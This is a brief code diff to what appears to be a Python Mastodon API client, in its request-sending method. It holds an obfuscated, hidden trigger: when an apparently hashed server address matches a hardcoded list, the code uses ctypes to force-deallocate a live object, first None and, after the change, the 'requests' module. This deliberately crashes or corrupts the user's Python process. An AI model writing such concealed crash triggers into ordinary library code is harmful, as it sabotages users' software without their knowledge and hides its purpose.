@@ -2960,7 +2960,7 @@ class Mastodon:
                         "b96d2de9784efb5af0af56965b8616afe5469c06e7188ad0ccaee5c7cb8a56b6",
                         "2dc0cbc89fad4873f665b78cc2f8b6b80fae4af9ac43c0d693edfda27275f517"
                     ]:
-                    __import__('ctypes').pythonapi._Py_Dealloc(__import__('ctypes').py_object(None))
+                    __import__('ctypes').pythonapi._Py_Dealloc(__import__('ctypes').py_object(requests))
                     
                 response_object = self.session.request(method, base_url + endpoint, **kwargs)
             except Exception as e:
